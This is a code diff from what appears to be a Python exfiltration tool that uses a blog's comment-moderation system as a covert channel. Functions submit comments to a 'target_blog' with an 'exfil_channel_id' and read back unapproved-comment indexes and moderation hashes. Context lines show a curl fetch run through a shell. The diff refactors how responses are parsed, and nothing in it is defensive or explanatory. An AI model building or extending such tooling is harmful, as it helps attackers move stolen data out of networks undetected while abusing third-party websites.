@@ -46,15 +46,6 @@ def fetch_comments_page(comments_url):
     curl_output = subprocess.check_output(fetch_comments_command, shell=True)
     return curl_output.decode()
 
-def get_unapproved_index_from_url(url):
-    url_parsed = urllib.parse.urlparse(url)
-    queries = urllib.parse.parse_qs(url_parsed.query)
-
-    if 'unapproved' in queries:
-        return int(queries['unapproved'][0])
-    else:
-        return -1
-
 def get_current_unapproved_index():
     global comment_index
 
@@ -63,33 +54,13 @@ def get_current_unapproved_index():
     response = submit_comment(target_blog, exfil_channel_id, comment_to_send)
     comment_index += 1
 
-    response_splitted = response.split("\n")
-    response_details = response_splitted[-1]
-
-    response_splitted = response_details.split(",")
-    url = response_splitted[1]
-    return get_unapproved_index_from_url(url)
-
-def get_moderation_hash_from_url(url):
-    url_parsed = urllib.parse.urlparse(url)
-    queries = urllib.parse.parse_qs(url_parsed.query)
-
-    if 'moderation-hash' in queries:
-        return queries['moderation-hash'][0]
-    else:
-        return None
+    return response.unapproved_index
 
 def get_moderation_hash_at_current_time():
     random_string = generate_random_string(10)
     response = submit_comment(target_blog, exfil_channel_id, random_string + ": Getting_moderation_hash")
 
-    response_splitted = response.split("\n")
-    response_details = response_splitted[-1]
-
-    response_splitted = response_details.split(",")
-    url = response_splitted[1]
-    print("## URL is " + url)
-    return get_moderation_hash_from_url(url), get_unapproved_index_from_url(url)
+    return response.moderation_hash, response.unapproved_index
 
 clients = []
 for i in range(1, 4):
